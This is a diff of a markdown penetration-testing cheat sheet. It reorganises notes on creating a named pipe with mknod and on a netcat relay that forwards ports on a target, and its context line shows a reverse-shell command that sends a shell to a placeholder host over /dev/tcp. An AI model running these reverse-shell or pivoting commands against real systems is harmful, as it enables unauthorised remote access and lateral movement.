@@ -54,16 +54,17 @@ python -i >& /dev/tcp/[host]/[port] 0>&1
 
 
 
-### Create FIFO ###
+### Relay / Port Redirection ###
+
+**Create FIFO**
+
 First in First Out, also known as named pipes, created by using `mknod p`. The `p` flag == type FIFO.
 ```
 mknod [pipe-name] p
 ```
 
+**Relay**
 
-
-
-### Relay / Port Redirection ###
 Create a loopback which will relay traffic between `localhost:[Port-A]` and `localhost:[Port-B]` on the target, allowing inbound connections to `localhost:[Port-B]` to be directed at `[Port-A]`.
 ```
 nc -l -p [Port-B] 0< [pipe-name] | nc localhost [Port-A] 1> [pipe-name]
